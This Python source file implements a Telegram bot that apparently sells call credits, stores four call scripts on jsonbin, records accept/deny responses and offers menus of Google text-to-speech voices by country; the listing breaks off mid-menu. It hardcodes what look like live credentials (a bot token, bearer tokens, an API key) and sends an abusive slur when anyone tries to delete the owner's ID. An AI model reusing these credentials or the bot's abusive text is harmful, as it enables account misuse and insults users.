

from cmd import IDENTCHARS
from flask import Flask, request, make_response, Response, session
import json,requests
import flask
import telebot
from dbase import *
import urllib.request
import time
from telebot import types

token = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0IiwiaWF0IjoxNjg0ODgwNTczLCJleHAiOjE2ODc0Nzg0MDB9.LBMhgQApgiN6cBpxGlDuqVhP73i6Xn41i6wlG9hsuw8"
token_2 = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyaWRlcmdvZEBnbWFpbC5jb20iLCJpYXQiOjE2ODU1NjgxNDcsImV4cCI6MTY4ODA4MzIwMH0.sAoNBO2kwqLnA3H3FpkDNqrBV16W7Vhuv8QxYUDgyp8"
callurl = 'https://7701-49-37-24-63.ngrok-free.app'
api_key = '$2b$10$vY1.t/8qUWrxivBUkJsZdOu.SgiFmZ60K0StAlnCYDf7rmdz8W1sS'
headers = {
    'Authorization': token_2,
    'Content-Type': 'application/json',
    'accept': 'application/json'
}
# 0 False
# 1 True
accepted = False
google_voice_name = ['eu-ES-Standard-A', 'gl-ES-Standard-A', 'mr-IN-Standard-A', 'mr-IN-Standard-B', 'mr-IN-Standard-C', 'pa-IN-Standard-A', 'pa-IN-Standard-B', 'pa-IN-Standard-C', 'pa-IN-Standard-D', 'sv-SE-Standard-B', 'sv-SE-Standard-C', 'sv-SE-Standard-D', 'sv-SE-Standard-E', 'sv-SE-Standard-A', 'ta-IN-Standard-C', 'ta-IN-Standard-D', 'yue-HK-Standard-A', 'yue-HK-Standard-B', 'yue-HK-Standard-C', 'yue-HK-Standard-D', 'bn-IN-Standard-A', 'bn-IN-Standard-B', 'cmn-CN-Standard-C', 'cmn-CN-Standard-B', 'cmn-CN-Standard-A', 'cmn-CN-Standard-D', 'cmn-TW-Standard-A', 'cmn-TW-Standard-B', 'cmn-TW-Standard-C', 'es-US-Standard-A', 'es-US-Standard-B', 'es-US-Standard-C', 'gu-IN-Standard-A', 'gu-IN-Standard-B', 'ja-JP-Standard-A', 'ja-JP-Standard-B', 'ja-JP-Standard-C', 'ja-JP-Standard-D', 'kn-IN-Standard-A', 'kn-IN-Standard-B', 'ml-IN-Standard-A', 'ml-IN-Standard-B', 'nl-BE-Standard-A', 'nl-BE-Standard-B', 'ta-IN-Standard-A', 'ta-IN-Standard-B', 'af-ZA-Standard-A', 'ar-XA-Standard-A', 'ar-XA-Standard-B', 'ar-XA-Standard-C', 'ar-XA-Standard-D', 'bg-BG-Standard-A', 'cs-CZ-Standard-A', 'da-DK-Standard-C', 'da-DK-Standard-D', 'da-DK-Standard-E', 'da-DK-Standard-A', 'de-DE-Standard-A', 'de-DE-Standard-B', 'de-DE-Standard-C', 'de-DE-Standard-D', 'de-DE-Standard-E', 'de-DE-Standard-F', 'en-AU-Standard-A', 'en-AU-Standard-B', 'en-AU-Standard-C', 'en-AU-Standard-D', 'en-GB-Standard-A', 'en-GB-Standard-B', 'en-GB-Standard-C', 'en-GB-Standard-D', 'en-GB-Standard-F', 'en-IN-Standard-D', 'en-IN-Standard-A', 'en-IN-Standard-B', 'en-IN-Standard-C', 'en-US-Standard-A', 'en-US-Standard-B', 'en-US-Standard-C', 'en-US-Standard-D', 'en-US-Standard-E', 'en-US-Standard-F', 'en-US-Standard-G', 'en-US-Standard-H', 'en-US-Standard-I', 'en-US-Standard-J', 'es-ES-Standard-A', 'es-ES-Standard-C', 'es-ES-Standard-D', 'es-ES-Standard-B', 'fi-FI-Standard-A', 'fr-CA-Standard-A', 'fr-CA-Standard-B', 'fr-CA-Standard-C', 'fr-CA-Standard-D', 'fr-FR-Standard-A', 'fr-FR-Standard-B', 'fr-FR-Standard-C', 'fr-FR-Standard-D', 'fr-FR-Standard-E', 'he-IL-Standard-D', 'he-IL-Standard-A', 'he-IL-Standard-B', 'he-IL-Standard-C', 'hi-IN-Standard-D', 'hi-IN-Standard-A', 'hi-IN-Standard-B', 'hi-IN-Standard-C', 'hu-HU-Standard-A', 'is-IS-Standard-A', 'lt-LT-Standard-A', 'lv-LV-Standard-A', 'ms-MY-Standard-A', 'ms-MY-Standard-B', 'ms-MY-Standard-C', 'ms-MY-Standard-D', 'nb-NO-Standard-A', 'nb-NO-Standard-B', 'nb-NO-Standard-E', 'nb-NO-Standard-C', 'nb-NO-Standard-D', 'nl-NL-Standard-B', 'nl-NL-Standard-C', 'nl-NL-Standard-D', 'nl-NL-Standard-A', 'nl-NL-Standard-E', 'pt-BR-Standard-A', 'pt-BR-Standard-B', 'pt-BR-Standard-C', 'pt-PT-Standard-A', 'pt-PT-Standard-B', 'pt-PT-Standard-C', 'pt-PT-Standard-D', 'ro-RO-Standard-A', 'ru-RU-Standard-E', 'ru-RU-Standard-A', 'ru-RU-Standard-B', 'ru-RU-Standard-C', 'ru-RU-Standard-D', 'sk-SK-Standard-A', 'sr-RS-Standard-A', 'th-TH-Standard-A', 'uk-UA-Standard-A', 'vi-VN-Standard-A', 'vi-VN-Standard-B', 'vi-VN-Standard-C', 'vi-VN-Standard-D', 'pl-PL-Standard-A', 'pl-PL-Standard-B', 'pl-PL-Standard-C', 'pl-PL-Standard-E', 'pl-PL-Standard-D', 'tr-TR-Standard-B', 'tr-TR-Standard-C', 'tr-TR-Standard-D', 'tr-TR-Standard-A', 'tr-TR-Standard-E', 'id-ID-Standard-A', 'id-ID-Standard-B', 'id-ID-Standard-C', 'id-ID-Standard-D', 'fil-PH-Standard-A', 'fil-PH-Standard-B', 'fil-PH-Standard-C', 'fil-PH-Standard-D', 'ca-ES-Standard-A', 'it-IT-Standard-B', 'it-IT-Standard-C', 'it-IT-Standard-D', 'it-IT-Standard-A', 'el-GR-Standard-A', 'ko-KR-Standard-A', 'ko-KR-Standard-B', 'ko-KR-Standard-C', 'ko-KR-Standard-D', 'te-IN-Standard-A', 'te-IN-Standard-B', 'ar-XA-Wavenet-A', 'ar-XA-Wavenet-B', 'ar-XA-Wavenet-C', 'ar-XA-Wavenet-D', 'bn-IN-Wavenet-A', 'bn-IN-Wavenet-B', 'cmn-CN-Wavenet-A', 'cmn-CN-Wavenet-B', 'cmn-CN-Wavenet-C', 'cmn-CN-Wavenet-D', 'cmn-TW-Wavenet-A', 'cmn-TW-Wavenet-B', 'cmn-TW-Wavenet-C', 'cs-CZ-Wavenet-A', 'da-DK-Wavenet-C', 'da-DK-Wavenet-D', 'da-DK-Wavenet-E', 'da-DK-Wavenet-A', 'de-DE-Wavenet-F', 'de-DE-Wavenet-A', 'de-DE-Wavenet-B', 'de-DE-Wavenet-C', 'de-DE-Wavenet-D', 'de-DE-Wavenet-E', 'el-GR-Wavenet-A', 'en-AU-News-E', 'en-AU-News-F', 'en-AU-News-G', 'en-AU-Wavenet-A', 'en-AU-Wavenet-B', 'en-AU-Wavenet-C', 'en-AU-Wavenet-D', 'en-GB-News-G', 'en-GB-News-H', 'en-GB-News-I', 'en-GB-News-J', 'en-GB-News-K', 'en-GB-News-L', 'en-GB-News-M', 'en-GB-Wavenet-A', 'en-GB-Wavenet-B', 'en-GB-Wavenet-C', 'en-GB-Wavenet-D', 'en-GB-Wavenet-F', 'en-IN-Wavenet-D', 'en-IN-Wavenet-A', 'en-IN-Wavenet-B', 'en-IN-Wavenet-C', 'en-US-News-K', 'en-US-News-L', 'en-US-News-M', 'en-US-News-N', 'en-US-Wavenet-G', 'en-US-Wavenet-H', 'en-US-Wavenet-I', 'en-US-Wavenet-J', 'en-US-Wavenet-A', 'en-US-Wavenet-B', 'en-US-Wavenet-C', 'en-US-Wavenet-D', 'en-US-Wavenet-E', 'en-US-Wavenet-F', 'es-ES-Wavenet-C', 'es-ES-Wavenet-D', 'es-ES-Wavenet-B', 'es-US-Wavenet-A', 'es-US-Wavenet-B', 'es-US-Wavenet-C', 'es-US-News-G', 'es-US-News-F', 'es-US-News-E', 'es-US-News-D', 'fi-FI-Wavenet-A', 'fil-PH-Wavenet-A', 'fil-PH-Wavenet-B', 'fil-PH-Wavenet-C', 'fil-PH-Wavenet-D', 'fr-CA-Wavenet-A', 'fr-CA-Wavenet-B', 'fr-CA-Wavenet-C', 'fr-CA-Wavenet-D', 'fr-FR-Wavenet-E', 'fr-FR-Wavenet-A', 'fr-FR-Wavenet-B', 'fr-FR-Wavenet-C', 'fr-FR-Wavenet-D', 'gu-IN-Wavenet-A', 'gu-IN-Wavenet-B', 'he-IL-Wavenet-D', 'he-IL-Wavenet-A', 'he-IL-Wavenet-B', 'he-IL-Wavenet-C', 'hi-IN-Wavenet-D', 'hi-IN-Wavenet-A', 'hi-IN-Wavenet-B', 'hi-IN-Wavenet-C', 'hu-HU-Wavenet-A', 'id-ID-Wavenet-D', 'id-ID-Wavenet-A', 'id-ID-Wavenet-B', 'id-ID-Wavenet-C', 'it-IT-Wavenet-A', 'it-IT-Wavenet-B', 'it-IT-Wavenet-C', 'it-IT-Wavenet-D', 'ja-JP-Wavenet-B', 'ja-JP-Wavenet-C', 'ja-JP-Wavenet-D', 'ja-JP-Wavenet-A', 'kn-IN-Wavenet-A', 'kn-IN-Wavenet-B', 'ko-KR-Wavenet-A', 'ko-KR-Wavenet-B', 'ko-KR-Wavenet-C', 'ko-KR-Wavenet-D', 'ml-IN-Wavenet-A', 'ml-IN-Wavenet-B', 'ml-IN-Wavenet-C', 'ml-IN-Wavenet-D', 'mr-IN-Wavenet-A', 'mr-IN-Wavenet-B', 'mr-IN-Wavenet-C', 'ms-MY-Wavenet-A', 'ms-MY-Wavenet-B', 'ms-MY-Wavenet-C', 'ms-MY-Wavenet-D', 'nb-NO-Wavenet-A', 'nb-NO-Wavenet-B', 'nb-NO-Wavenet-C', 'nb-NO-Wavenet-D', 'nb-NO-Wavenet-E', 'nl-BE-Wavenet-A', 'nl-BE-Wavenet-B', 'nl-NL-Wavenet-B', 'nl-NL-Wavenet-C', 'nl-NL-Wavenet-D', 'nl-NL-Wavenet-A', 'nl-NL-Wavenet-E', 'pa-IN-Wavenet-A', 'pa-IN-Wavenet-B', 'pa-IN-Wavenet-C', 'pa-IN-Wavenet-D', 'pl-PL-Wavenet-A', 'pl-PL-Wavenet-B', 'pl-PL-Wavenet-C', 'pl-PL-Wavenet-E', 'pl-PL-Wavenet-D', 'pt-BR-Wavenet-A', 'pt-BR-Wavenet-B', 'pt-BR-Wavenet-C', 'pt-PT-Wavenet-A', 'pt-PT-Wavenet-B', 'pt-PT-Wavenet-C', 'pt-PT-Wavenet-D', 'ro-RO-Wavenet-A', 'ru-RU-Wavenet-E', 'ru-RU-Wavenet-A', 'ru-RU-Wavenet-B', 'ru-RU-Wavenet-C', 'ru-RU-Wavenet-D', 'sk-SK-Wavenet-A', 'sv-SE-Wavenet-B', 'sv-SE-Wavenet-D', 'sv-SE-Wavenet-C', 'sv-SE-Wavenet-E', 'sv-SE-Wavenet-A', 'ta-IN-Wavenet-A', 'ta-IN-Wavenet-B', 'ta-IN-Wavenet-C', 'ta-IN-Wavenet-D', 'tr-TR-Wavenet-B', 'tr-TR-Wavenet-C', 'tr-TR-Wavenet-D', 'tr-TR-Wavenet-E', 'tr-TR-Wavenet-A', 'uk-UA-Wavenet-A', 'vi-VN-Wavenet-A', 'vi-VN-Wavenet-B', 'vi-VN-Wavenet-C', 'vi-VN-Wavenet-D', 'en-US-Studio-M', 'en-US-Studio-O', 'es-US-Studio-B', 'da-DK-Neural2-D', 'da-DK-Neural2-F', 'de-DE-Neural2-B', 'de-DE-Neural2-C', 'de-DE-Neural2-D', 'de-DE-Neural2-F', 'de-DE-Polyglot-1', 'en-AU-Neural2-A', 'en-AU-Neural2-B', 'en-AU-Neural2-C', 'en-AU-Neural2-D', 'en-AU-Polyglot-1', 'en-GB-Neural2-A', 'en-GB-Neural2-B', 'en-GB-Neural2-C', 'en-GB-Neural2-D', 'en-GB-Neural2-F', 'en-US-Neural2-A', 'en-US-Neural2-C', 'en-US-Neural2-D', 'en-US-Neural2-E', 'en-US-Neural2-F', 'en-US-Neural2-G', 'en-US-Neural2-H', 'en-US-Neural2-I', 'en-US-Neural2-J', 'en-US-Polyglot-1', 'es-ES-Neural2-A', 'es-ES-Neural2-B', 'es-ES-Neural2-C', 'es-ES-Neural2-D', 'es-ES-Neural2-E', 'es-ES-Neural2-F', 'es-ES-Polyglot-1', 'es-US-Neural2-A', 'es-US-Neural2-B', 'es-US-Neural2-C', 'es-US-Polyglot-1', 'fil-ph-Neural2-D', 'fil-ph-Neural2-A', 'fr-CA-Neural2-A', 'fr-CA-Neural2-B', 'fr-CA-Neural2-C', 'fr-CA-Neural2-D', 'fr-FR-Neural2-A', 'fr-FR-Neural2-B', 'fr-FR-Neural2-C', 'fr-FR-Neural2-D', 'fr-FR-Neural2-E', 'fr-FR-Polyglot-1', 'hi-IN-Neural2-A', 'hi-IN-Neural2-B', 'hi-IN-Neural2-C', 'hi-IN-Neural2-D', 'it-IT-Neural2-A', 'it-IT-Neural2-C', 'ja-JP-Neural2-B', 'ja-JP-Neural2-C', 'ja-JP-Neural2-D', 'ko-KR-Neural2-A', 'ko-KR-Neural2-B', 'ko-KR-Neural2-C', 'pt-BR-Neural2-A', 'pt-BR-Neural2-B', 'pt-BR-Neural2-C', 'vi-VN-Neural2-A', 'vi-VN-Neural2-D', 'th-TH-Neural2-C'] 
bot = telebot.TeleBot('6215479408:AAFoUKIx6UdUBYsf_CG_PmzbM6gY7w2sC_Q')
bot.remove_webhook()
bot.set_webhook(url=callurl)


def create_bin(script_1,script_2,script_3,script_4,api_key):
    url = 'https://api.jsonbin.io/v3/b'
    headers = {
    'Content-Type': 'application/json',
    'X-Master-Key': f'{api_key}'
    }
    data = {
    "sc_1" :f"{script_1}",
    "sc_2" : f"{script_2}",
    "sc_3" : f"{script_3}",
    "sc_4" : f"{script_4}"
    }
    req = requests.post(url, json=data,headers=headers)
    return req.json()['metadata']['id']

def get_script(binid,api_key):
    
    url = f'https://api.jsonbin.io/v3/b/{binid}/'
    headers = {
    'X-Master-Key': f'{api_key}'
    }

    req = requests.get(url, json=None,headers= headers)
    return req.json()['record']

def check_script(binid,api_key):
    
    url = f'https://api.jsonbin.io/v3/b/{binid}/'
    headers = {
    'X-Master-Key': f'{api_key}'
    }

    req = requests.get(url, json=None,headers= headers)
    if req.status_code == 200:
        return True
    else:
        return False


app = Flask(__name__)
def adminfunction(message):
    userid = message.from_user.id
    name = message.from_user.first_name
    keyboard = types.InlineKeyboardMarkup()
    item = types.InlineKeyboardButton("Edit access",callback_data="Edit access")
    keyboard.add(item)
    bot.send_message(message.chat.id, f"Please choose an option, {name}. 👑", reply_markup=keyboard)
def edit_access(message):
    userid = message.from_user.id
    keyboard = types.InlineKeyboardMarkup()
    item1 = types.InlineKeyboardButton("Add Admin",callback_data="Add Admin")
    item2 = types.InlineKeyboardButton("Add User",callback_data="Add User")
    item3 = types.InlineKeyboardButton("Delete Admin",callback_data="Delete Admin")
    item4 = types.InlineKeyboardButton("Delete User",callback_data="Delete User")
    keyboard.add(item1, item2)
    keyboard.add(item3, item4)
    bot.send_message(message.chat.id, "Ok , what next ?", reply_markup=keyboard)


def add_admin(message):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, save_id_admin)


def save_id_admin(message):
    adminid = message.text
    create_admin(adminid)
    create_user_lifetime(adminid)
    bot.send_message(message.chat.id, f"Added Admin \n\n"
                                          "Use /start for other functionality\n"
                                          )


def type_of_user(message):
    userid = message.from_user.id
    keyboard = types.InlineKeyboardMarkup()
    item1 = types.InlineKeyboardButton("Test",callback_data="Test")
   
    keyboard.add(item1)

    bot.send_message(message.chat.id, "Ok , what next ?", reply_markup=keyboard)

def add_user_test(message):
    send = bot.send_message(message.chat.id, "Enter UserID:CALLS : ")
    bot.register_next_step_handler(send, createtest_user)

def createtest_user(message):
    try:
        name = message.from_user.first_name
        userid,calls = str(message.text).split(':')
        print(userid,calls)
        create_user_test(userid,calls)
        bot.send_message('-1001770626655', f"Calls {calls} Added To User:{userid}")

        bot.send_message(message.chat.id, f"Added user for Test calls \n\n"
                                          "Use /start for other functionality\n"
                                          "Good bye")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

        return ''
def statsu(message):
    id = message.chat.id
    #print(message)
    print(id)
    c.execute("SELECT user_id FROM UserData")
    listuserid = c.fetchall()
    conn.commit()
    sta = len(listuserid)
    print(len(listuserid))
    bot.send_message(id, f"*Total User In Bot >> {sta}\n\n[+]Only The Member Who Have Added To Database*" ,parse_mode='Markdown')
    return listuserid

def delete_admin(message):
    send = bot.send_message(message.chat.id, "Enter userid: ")
    bot.register_next_step_handler(send, delete_id_admin)


def delete_id_admin(message):
    userid = message.text
    if userid == "2047475714" or userid == 2047475714 or "2047475714" in userid:
        bot.send_message(message.chat.id, f" BSDK TERI MKC LODE CHINAL APNE BAP KO CHODNA MAT SIKHA ")
    else:
        delete_specific_AdminData(userid)
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"Deleted Admin\n\n"
                                        "Use /start for other functionality")


def delete_user(message):
    send = bot.send_message(message.chat.id, "Enter userid: ")
    bot.register_next_step_handler(send, delete_id_user)


def delete_id_user(message):
    userid = message.text
    if userid == "2047475714" or userid == 2047475714 or "2047475714" in userid:
        bot.send_message(message.chat.id, f" BSDK TERI MKC LODE CHINAL APNE BAP KO CHODNA MAT SIKHA ")
    else:
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"Deleted user\n\n"
                                        "Use /start for other functionality")


@bot.callback_query_handler(func=lambda message:True )
def mode_handler(call):
    global accepted
    if call.data == "Admin mode":   
        adminfunction(call.message)
    if call.data == "Edit access":
        edit_access(call.message)
    if call.data == "botcommands":   
        botcommands(call.message)
    if call.data == "Add Admin":
        add_admin(call.message)
    if call.data == "Add User":
        type_of_user(call.message)
    if call.data == "botstats":
        statsu(call.message)
    if call.data == "Delete Admin":
        delete_admin(call.message)
    if call.data == "Delete User":
        delete_user(call.message)
    if call.data == "Test":
        add_user_test(call.message)
    if call.data == "accept":
        save_flag(0,call.message.chat.id)
    elif call.data == 'deny':
        save_flag(1,call.message.chat.id)
        print('DEnies')
    elif call.data == "back":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("ES",callback_data="ES")
        item2 = types.InlineKeyboardButton("IN",callback_data="IN")
        item3 = types.InlineKeyboardButton("SE",callback_data="SE")
        item4 = types.InlineKeyboardButton("HK",callback_data="HK")
        item5 = types.InlineKeyboardButton("CN",callback_data="CN")
        item6 = types.InlineKeyboardButton("TW",callback_data="TW")
        item7 = types.InlineKeyboardButton("US",callback_data="US")
        item8 = types.InlineKeyboardButton("JP",callback_data="JP")
        item9 = types.InlineKeyboardButton("BE",callback_data="BE")
        item10 = types.InlineKeyboardButton("ZA",callback_data="ZA")
        item11 = types.InlineKeyboardButton("XA",callback_data="XA")
        item12 = types.InlineKeyboardButton("BG",callback_data="BG")
        item13 = types.InlineKeyboardButton("CZ",callback_data="CZ")
        item14 = types.InlineKeyboardButton("DK",callback_data="DK")
        item15 = types.InlineKeyboardButton("DE",callback_data="DE")
        item16 = types.InlineKeyboardButton("AU",callback_data="AU")
        item17 = types.InlineKeyboardButton("GB",callback_data="GB")
        item18 = types.InlineKeyboardButton("FI",callback_data="FI")
        item19 = types.InlineKeyboardButton("CA",callback_data="CA")
        item20 = types.InlineKeyboardButton("FR",callback_data="FR")
        item21 = types.InlineKeyboardButton("IL",callback_data="IL")
        item22 = types.InlineKeyboardButton("HU",callback_data="HU")
        item23 = types.InlineKeyboardButton("IS",callback_data="IS")
        item24 = types.InlineKeyboardButton("LT",callback_data="LT")
        item25 = types.InlineKeyboardButton("LV",callback_data="LV")
        item26 = types.InlineKeyboardButton("MY",callback_data="MY")
        item27 = types.InlineKeyboardButton("NO",callback_data="NO")
        item28 = types.InlineKeyboardButton("NL",callback_data="NL")
        item29 = types.InlineKeyboardButton("BR",callback_data="BR")
        item30 = types.InlineKeyboardButton("PT",callback_data="PT")
        item31 = types.InlineKeyboardButton("RO",callback_data="RO")
        item32 = types.InlineKeyboardButton("RU",callback_data="RU")
        item33 = types.InlineKeyboardButton("SK",callback_data="SK")
        item34 = types.InlineKeyboardButton("RS",callback_data="RS")
        item35 = types.InlineKeyboardButton("TH",callback_data="TH")
        item36 = types.InlineKeyboardButton("UA",callback_data="UA")
        item37 = types.InlineKeyboardButton("VN",callback_data="VN")
        item38 = types.InlineKeyboardButton("PL",callback_data="PL")
        item39 = types.InlineKeyboardButton("TR",callback_data="TR")
        item40 = types.InlineKeyboardButton("ID",callback_data="ID")
        item41 = types.InlineKeyboardButton("PH",callback_data="PH")
        item42 = types.InlineKeyboardButton("IT",callback_data="IT")
        item43 = types.InlineKeyboardButton("GR",callback_data="GR")
        item44 = types.InlineKeyboardButton("KR",callback_data="KR")
        item45 = types.InlineKeyboardButton("ph",callback_data="ph")
        updated_keyboard.add(item1, item2,item3,item4,item5,item6,item7,item8,item9,item10,item11, item12,item13,item14,item15,item16,item17,item18,item19,item20,item21, item22,item23,item24,item25,item26,item27,item28,item29,item30,item31, item32,item33,item34,item35,item36,item37,item38,item39,item40,item41,item42,item43,item44,item45)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🎶 Available Countries In Our Bot 🎶')
        
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    
    elif call.data == "SE":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("sv-SE-Standard-B",callback_data="sv-SE-Standard-B")
        item2 = types.InlineKeyboardButton("sv-SE-Standard-C",callback_data="sv-SE-Standard-C")
        item3 = types.InlineKeyboardButton("sv-SE-Standard-D",callback_data="sv-SE-Standard-D")
        item4 = types.InlineKeyboardButton("sv-SE-Standard-E",callback_data="sv-SE-Standard-E")
        item5 = types.InlineKeyboardButton("sv-SE-Standard-A",callback_data="sv-SE-Standard-A")
        item6 = types.InlineKeyboardButton("sv-SE-Wavenet-B",callback_data="sv-SE-Wavenet-B")
        item7 = types.InlineKeyboardButton("sv-SE-Wavenet-D",callback_data="sv-SE-Wavenet-D")
        item8 = types.InlineKeyboardButton("sv-SE-Wavenet-C",callback_data="sv-SE-Wavenet-C")
        item9 = types.InlineKeyboardButton("sv-SE-Wavenet-E",callback_data="sv-SE-Wavenet-E")
        item10 = types.InlineKeyboardButton("sv-SE-Wavenet-A",callback_data="sv-SE-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇸🇪 Available Voice/Languages In Sweden 🇸🇪')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "HK":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("yue-HK-Standard-A",callback_data="yue-HK-Standard-A")
        item2 = types.InlineKeyboardButton("yue-HK-Standard-B",callback_data="yue-HK-Standard-B")
        item3 = types.InlineKeyboardButton("yue-HK-Standard-C",callback_data="yue-HK-Standard-C")
        item4 = types.InlineKeyboardButton("yue-HK-Standard-D",callback_data="yue-HK-Standard-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇭🇰 Available Voice/Languages In Country	Hong Kong 🇭🇰')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "CN":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("cmn-CN-Standard-C",callback_data="cmn-CN-Standard-C")
        item2 = types.InlineKeyboardButton("cmn-CN-Standard-B",callback_data="cmn-CN-Standard-B")
        item3 = types.InlineKeyboardButton("cmn-CN-Standard-A",callback_data="cmn-CN-Standard-A")
        item4 = types.InlineKeyboardButton("cmn-CN-Standard-D",callback_data="cmn-CN-Standard-D")
        item5 = types.InlineKeyboardButton("cmn-CN-Wavenet-A",callback_data="cmn-CN-Wavenet-A")
        item6 = types.InlineKeyboardButton("cmn-CN-Wavenet-B",callback_data="cmn-CN-Wavenet-B")
        item7 = types.InlineKeyboardButton("cmn-CN-Wavenet-C",callback_data="cmn-CN-Wavenet-C")
        item8 = types.InlineKeyboardButton("cmn-CN-Wavenet-D",callback_data="cmn-CN-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇨🇳 Available Voice/Languages In Country	China 🇨🇳')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "TW":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("cmn-TW-Standard-A",callback_data="cmn-TW-Standard-A")
        item2 = types.InlineKeyboardButton("cmn-TW-Standard-B",callback_data="cmn-TW-Standard-B")
        item3 = types.InlineKeyboardButton("cmn-TW-Standard-C",callback_data="cmn-TW-Standard-C")
        item4 = types.InlineKeyboardButton("cmn-TW-Wavenet-A",callback_data="cmn-TW-Wavenet-A")
        item5 = types.InlineKeyboardButton("cmn-TW-Wavenet-B",callback_data="cmn-TW-Wavenet-B")
        item6 = types.InlineKeyboardButton("cmn-TW-Wavenet-C",callback_data="cmn-TW-Wavenet-C")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇹🇼 Available Voice/Languages In Country	Taiwan 🇹🇼')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "US":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("es-US-Standard-A",callback_data="es-US-Standard-A")
        item2 = types.InlineKeyboardButton("es-US-Standard-B",callback_data="es-US-Standard-B")
        item3 = types.InlineKeyboardButton("es-US-Standard-C",callback_data="es-US-Standard-C")
        item4 = types.InlineKeyboardButton("en-US-Standard-A",callback_data="en-US-Standard-A")
        item5 = types.InlineKeyboardButton("en-US-Standard-B",callback_data="en-US-Standard-B")
        item6 = types.InlineKeyboardButton("en-US-Standard-C",callback_data="en-US-Standard-C")
        item7 = types.InlineKeyboardButton("en-US-Standard-D",callback_data="en-US-Standard-D")
        item8 = types.InlineKeyboardButton("en-US-Standard-E",callback_data="en-US-Standard-E")
        item9 = types.InlineKeyboardButton("en-US-Standard-F",callback_data="en-US-Standard-F")
        item10 = types.InlineKeyboardButton("en-US-Standard-G",callback_data="en-US-Standard-G")
        item11 = types.InlineKeyboardButton("en-US-Standard-H",callback_data="en-US-Standard-H")
        item12 = types.InlineKeyboardButton("en-US-Standard-I",callback_data="en-US-Standard-I")
        item13 = types.InlineKeyboardButton("en-US-Standard-J",callback_data="en-US-Standard-J")
        item14 = types.InlineKeyboardButton("en-US-News-K",callback_data="en-US-News-K")
        item15 = types.InlineKeyboardButton("en-US-News-L",callback_data="en-US-News-L")
        item16 = types.InlineKeyboardButton("en-US-News-M",callback_data="en-US-News-M")
        item17 = types.InlineKeyboardButton("en-US-News-N",callback_data="en-US-News-N")
        item18 = types.InlineKeyboardButton("en-US-Wavenet-G",callback_data="en-US-Wavenet-G")
        item19 = types.InlineKeyboardButton("en-US-Wavenet-H",callback_data="en-US-Wavenet-H")
        item20 = types.InlineKeyboardButton("en-US-Wavenet-I",callback_data="en-US-Wavenet-I")
        item21 = types.InlineKeyboardButton("en-US-Wavenet-J",callback_data="en-US-Wavenet-J")
        item22 = types.InlineKeyboardButton("en-US-Wavenet-A",callback_data="en-US-Wavenet-A")
        item23 = types.InlineKeyboardButton("en-US-Wavenet-B",callback_data="en-US-Wavenet-B")
        item24 = types.InlineKeyboardButton("en-US-Wavenet-C",callback_data="en-US-Wavenet-C")
        item25 = types.InlineKeyboardButton("en-US-Wavenet-D",callback_data="en-US-Wavenet-D")
        item26 = types.InlineKeyboardButton("en-US-Wavenet-E",callback_data="en-US-Wavenet-E")
        item27 = types.InlineKeyboardButton("en-US-Wavenet-F",callback_data="en-US-Wavenet-F")
        item28 = types.InlineKeyboardButton("es-US-Wavenet-A",callback_data="es-US-Wavenet-A")
        item29 = types.InlineKeyboardButton("es-US-Wavenet-B",callback_data="es-US-Wavenet-B")
        item30 = types.InlineKeyboardButton("es-US-Wavenet-C",callback_data="es-US-Wavenet-C")
        item31 = types.InlineKeyboardButton("es-US-News-G",callback_data="es-US-News-G")
        item32 = types.InlineKeyboardButton("es-US-News-F",callback_data="es-US-News-F")
        item33 = types.InlineKeyboardButton("es-US-News-E",callback_data="es-US-News-E")
        item34 = types.InlineKeyboardButton("es-US-News-D",callback_data="es-US-News-D")
        item35 = types.InlineKeyboardButton("en-US-Studio-M",callback_data="en-US-Studio-M")
        item36 = types.InlineKeyboardButton("en-US-Studio-O",callback_data="en-US-Studio-O")
        item37 = types.InlineKeyboardButton("es-US-Studio-B",callback_data="es-US-Studio-B")
        item38 = types.InlineKeyboardButton("en-US-Neural2-A",callback_data="en-US-Neural2-A")
        item39 = types.InlineKeyboardButton("en-US-Neural2-C",callback_data="en-US-Neural2-C")
        item40 = types.InlineKeyboardButton("en-US-Neural2-D",callback_data="en-US-Neural2-D")
